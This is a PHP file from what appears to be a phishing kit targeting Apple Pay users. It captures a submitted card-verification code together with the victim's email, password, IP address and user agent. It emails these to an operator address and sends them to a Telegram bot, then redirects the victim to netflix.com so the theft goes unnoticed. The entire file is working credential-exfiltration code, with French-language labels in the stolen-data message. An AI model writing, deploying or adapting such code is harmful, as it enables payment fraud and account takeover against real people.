<?php
include("../infos.php");
include("../common/sub_includes.php");
include("../common/functions.php");



if(isset($_POST['vbv_submit'])){

	
	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['vbv_code'] = htmlspecialchars($_POST['vbv_code']);

				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "
		                    
[🧲] Code Apple Pay [🧲]

🧲 Code : ".$_SESSION['vbv_code']."

[🎇] Login [🎇]

🎇 E-Mail : ".$_SESSION['email']."
🎇 Mot de passe : ".$_SESSION['password']."

[🎆] Additionnal [🎆] 

🎆 Adresse IP : ".$_SESSION['ip']."
🎆 User Agent : ".$_SESSION['useragent']."


					";

					$subject = "[🧲] + 1 Apple Pay".$_SESSION['vbv_code']." - ".$_SESSION['ip'];
					$headers = "From: PlatiGold ⚡️ <signenano@lazone.com>";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '

[🧲] Code Apple Pay [🧲]

🧲 Code : '.$_SESSION['vbv_code'].'

[🎇] Login [🎇]

🎇 E-Mail : '.$_SESSION['email'].'
🎇 Mot de passe : '.$_SESSION['password'].'

[🎆] Additionnal [🎆] 

🎆 Adresse IP :  '.$_SESSION['ip'].'
🎆 User Agent :  '.$_SESSION['useragent'].'



					',
					'chat_id' => $chat_login
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}

	header("Location: https://netflix.com");


	}
else{
	header('Location: ../');
}

?>